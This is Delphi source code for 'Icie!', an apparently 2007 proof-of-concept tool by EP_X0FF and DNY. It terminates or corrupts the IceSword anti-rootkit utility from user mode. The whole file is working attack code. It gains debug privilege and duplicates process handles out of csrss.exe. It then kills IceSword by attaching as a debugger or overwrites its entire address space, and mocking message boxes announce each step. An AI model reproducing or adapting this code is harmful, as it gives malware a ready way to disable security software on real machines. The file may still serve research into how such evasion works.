{

  Icie! v0.122r (c) 2007 EP_X0FF, UG North
  originally coded by DNY & EP_X0FF, (c) 2006 UG North


  Version History:

  06.08.07: v0.122r
  second release recode - added ability for 'real' IceSword process killing

  09.07.07: v0.122
  second release - killing all IceSword languages versions <=1.22b1 and maybe 1.22b2,1.22b3 from User Mode

  23.12.06: v0.1
  initial release - killing IceSword <= 1.20 english versions from User Mode

}

//{$DEFINE minimum}
{$E exe}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}

{$IFDEF minimum}
program Icie1;
{$ENDIF}
{$IFNDEF minimum}
unit Icie1;
interface
implementation
{$ENDIF}

uses
  Windows, RTL, WinNative;

const
  mymsg: PWideChar = 'Author:pjf(ustc)';
  Icie: PWideChar = 'Icie! 0.122r';

var
  buf: LBuf;
  icie_f: boolean = false;
  IcieDrvLen: integer = 0;
  oti: POBJECT_TYPE_INFORMATION;
  obi: OBJECT_BASIC_INFORMATION;
  oni: UNICODE_STRING;

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

function ThreadEntry(param: pointer): DWORD; stdcall;  //заглушка для висючей ZwQueryObject
var
  iob: IO_STATUS_BLOCK;
begin
  result := ZwQueryInformationFile(DWORD(param), @iob, @oni, MAX_PATH, FileNameInformation);
end;

procedure QueryObjectName(handle: THANDLE); stdcall;
var
  hthread: THANDLE;
  tid: cardinal;
begin
  hthread := CreateThread(nil, 0, @ThreadEntry, pointer(handle), 0, tid);
  if (WaitForSingleObject(hthread, 500) = WAIT_TIMEOUT) then
  begin
    TerminateThread(hthread, 0);
    exit;
  end
  else
  begin
    ZwQueryObject(handle, ObjectNameInformation, @oni, MAX_PATH, nil);
    CloseHandle(hthread);
  end;
end;

const
  IcieDrv: PWideChar = '\Device\IsDrv';

function ProcessObjectExt(hObject: THANDLE): boolean;
var
  bytesIO: DWORD;
begin
  result := false;
  memzero(@oni, sizeof(oni));
  ZwQueryObject(hObject, ObjectBasicInformation, @obi, sizeof(obi), @bytesIO);
  bytesIO := obi.TypeInformationLength + 2;
  oti := pointer(LocalAlloc(LPTR, bytesIO));
  ZwQueryObject(hObject, ObjectTypeInformation, oti, bytesIO, @bytesIO);
  if (oti^.Name.PStr <> nil) then
    if (strcmpiW('File', oti.Name.PStr) = 0) then
    begin
      QueryObjectName(hObject);
      if (oni.PStr <> nil) then
        result := (strcmpinW(IcieDrv, oni.PStr, IcieDrvLen) = 0);
    end;
  LocalFree(HLOCAL(oti));
end;

type
  TProcess = record
    handle: THANDLE;
    processId: Cardinal;
  end;

function KillIcie(ProcessHandle: THANDLE): boolean;
var
  bytesIO: DWORD;
  buf: PSYSINFOBUF;
  c: integer;
begin
  result := false;
  if (DbgUiConnectToDbg() <> STATUS_SUCCESS) then exit;
  if (DbgUiDebugActiveProcess(ProcessHandle) <> STATUS_SUCCESS) then exit;
  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(GetCurrentProcess(), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
  for c := 0 to buf^.uHandleCount - 1 do
    if (buf^.rHandleTable[c].ProcessId = GetCurrentProcessId()) then
    begin
      if (buf^.rHandleTable[c].ObjectTypeNumber = $8) then
      begin
        ZwClose(buf^.rHandleTable[c].Handle);
        result := true;
        break;
      end;
    end;
  bytesIO := 0;
  ZwFreeVirtualMemory(GetCurrentProcess(), @buf, @bytesIO, MEM_RELEASE);
end;

procedure DetectIcieExt();
var
  h_dup, ph: THANDLE;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  i, c: integer;
  cid1: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;
  csrss_id: THANDLE;
  tmp1: LBuf;
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;
  processes: array[0..1023] of TProcess;
  pcount: cardinal;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  csrss_id := 0;
  pcount := 0;
  //processes client-server locating
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat
        ExtractFileNameW(pBuffer.szExeFile, tmp1);
        if (strcmpiW(tmp1, 'csrss.exe') = 0) then
        begin
          csrss_id := pBuffer.th32ProcessID;
          break;
        end;
      until (not Process32NextW(SnapShotHandle, @pBuffer));
  CloseHandle(SnapShotHandle);
  if (csrss_id = 0) then exit;

  attr.Length := sizeof(OBJECT_ATTRIBUTES);
  attr.RootDirectory := 0;
  attr.ObjectName := nil;
  attr.Attributes := 0;
  attr.SecurityDescriptor := nil;
  attr.SecurityQualityOfService := nil;

  cid1.UniqueProcess := csrss_id;
  cid1.UniqueThread := 0;
  ZwOpenProcess(@ph, PROCESS_ALL_ACCESS, @attr, @cid1);
  memzero(@processes, sizeof(processes));
  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(GetCurrentProcess(), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
  //сбор хэндлов процессов и их идентификаторов
  for c := 0 to buf^.uHandleCount - 1 do
    if (buf^.rHandleTable[c].ProcessId = csrss_id) then
    begin
      if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then
      begin
        if (ZwDuplicateObject(ph, buf^.rHandleTable[c].Handle, DWORD(-1), @processes[pcount].handle,
          0, 0, DUPLICATE_SAME_ACCESS) = STATUS_SUCCESS) then
        begin
          ZwQueryInformationProcess(processes[pcount].handle, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO);
          processes[pcount].processId := pbi.UniqueProcessId;
          inc(pcount);
        end;
      end;
    end;
  ZwClose(ph);
  h_dup := 0;
  //перебор и анализ хэндлов
  for i := 0 to pcount - 1 do
    for c := 0 to buf^.uHandleCount - 1 do
      if (buf^.rHandleTable[c].ProcessId = processes[i].processId) then
      begin
        if (ZwDuplicateObject(processes[i].handle, buf^.rHandleTable[c].Handle, DWORD(-1), @h_dup,
          0, 0, DUPLICATE_SAME_ACCESS) = STATUS_SUCCESS) then
          if ProcessObjectExt(h_dup) then
          begin
            icie_f := true;
            MessageBoxW(0, 'IceSword process successfully identified, lets terminate it', Icie, MB_ICONINFORMATION);
            if KillIcie(processes[i].handle) then MessageBoxW(0, 'Icie terminated =) l ol', Icie, 0) else
              MessageBoxW(0, 'Caramba!', nil, MB_OK);
          end;
        ZwClose(h_dup);
      end;

  for i := 0 to pcount - 1 do ZwClose(processes[i].handle);
  bytesIO := 0;
  ZwFreeVirtualMemory(GetCurrentProcess(), @buf, @bytesIO, MEM_RELEASE);
end;

procedure FuckIcie120(dwProcessId: DWORD);
var
  h_dup, ph: THANDLE;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  c: integer;
  cid1: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;
  csrss_id: THANDLE;
  tmp1: LBuf;
  pBuffer: PROCESSENTRY32W;
  SnapShotHandle: THANDLE;
  pbi: PROCESS_BASIC_INFORMATION;
  p0, p1: PChar;
  sz, oldp: ULONG;
begin
  csrss_id := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat
        ExtractFileNameW(pBuffer.szExeFile, tmp1);
        if (strcmpiW(tmp1, 'csrss.exe') = 0) then
        begin
          csrss_id := pBuffer.th32ProcessID;
          break;
        end;
      until (not Process32NextW(SnapShotHandle, @pBuffer));
  CloseHandle(SnapShotHandle);
  if (csrss_id <> 0) then MessageBoxW(0, 'backdoor friendly process located', Icie, MB_OK);

  attr.Length := sizeof(OBJECT_ATTRIBUTES);
  attr.RootDirectory := 0;
  attr.ObjectName := nil;
  attr.Attributes := 0;
  attr.SecurityDescriptor := nil;
  attr.SecurityQualityOfService := nil;

  cid1.UniqueProcess := csrss_id;
  cid1.UniqueThread := 0;
  ZwOpenProcess(@ph, PROCESS_ALL_ACCESS, @attr, @cid1);

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(GetCurrentProcess(), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
  for c := 0 to buf^.uHandleCount - 1 do
    if (buf^.rHandleTable[c].ProcessId = csrss_id) then
    begin
      if (buf^.rHandleTable[c].ObjectTypeNumber = 5) then
      begin
        if (ZwDuplicateObject(ph, buf^.rHandleTable[c].Handle, DWORD(-1), @h_dup,
          0, 0, DUPLICATE_SAME_ACCESS) = STATUS_SUCCESS) then
        begin
          ZwQueryInformationProcess(h_dup, ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO);
          if (pbi.UniqueProcessId = dwProcessId) then
          begin
            MessageBoxW(0, 'In a process... Press "Ok" and please wait few seconds, after it IceSword will be destroyed =)))))', Icie, MB_OK);
            p0 := pointer($10000);
            repeat
              p1 := p0;
              sz := $1000;
              if (ZwProtectVirtualMemory(h_dup, @p1, @sz, PAGE_EXECUTE_READWRITE, @oldp) = STATUS_SUCCESS) then
                ZwWriteVirtualMemory(h_dup, p0, buf, $1000, @oldp);
              p0 := p0 + $1000;
            until (DWORD(p0) >= $80000000);
            MessageBoxW(0, 'Icie is now f***d and unworkable =) l ol', Icie, 0);
          end;
          ZwClose(h_dup);
        end;
      end;
    end;
  ZwClose(ph);

  bytesIO := 0;
  ZwFreeVirtualMemory(GetCurrentProcess(), @buf, @bytesIO, MEM_RELEASE);
end;

function enum1202(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
var
  pid: Cardinal;
  buf1: LBuf;
  i, k: integer;
begin
  result := true;
  memzero(@buf, sizeof(LBuf));
  memzero(@buf1, sizeof(LBuf));
  GetWindowTextW(_hwnd, @buf, MAX_PATH);
  k := 0;
  for i := 0 to strlenW(buf) do
    if buf[i] <> ' ' then
    begin
      buf1[k] := buf[i];
      inc(k);
    end;

  if (strcmpiW(mymsg, @buf1) = 0) then
  begin
    MessageBoxW(0, 'Icie found, let''s f*** it!', Icie, 0);
    icie_f := true;
    GetWindowThreadProcessId(_hwnd, @pid);
    FuckIcie120(pid);
  end;
end;

function enum120(_hwnd: HWND; lParam: LPARAM): BOOL; stdcall;
begin
  result := true;
  EnumChildWindows(_hwnd, @enum1202, 0);
end;

procedure DetectIcie120();
begin
  EnumWindows(@enum120, 0);
end;

var
  prev: integer;

begin
  IcieDrvLen := strlenW(IcieDrv);
  if (RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, @prev) <> STATUS_SUCCESS) then
  begin
    MessageBoxW(0, 'Cannot get more privilegies', Icie, MB_OK);
    ExitProcess(0);
  end;
  MessageBoxW(0, 'This simple app demonstrates how to destroy untouchable IceSword (any version) from poor User Mode'#13#13#10 +
    'Inline Hooks will not help Icie!'#13#10'Demo by EP_X0FF and DNY', Icie, 0);
  DetectIcie120();
  if not icie_f then MessageBoxW(0, 'IceSword <= 1.20eng not found, forcing Super Mode, please wait few seconds', Icie, MB_OK);
  DetectIcieExt();
  if not icie_f then MessageBoxW(0, 'Icie not found :( Start Icie first! =)))', Icie, MB_OK);
end.
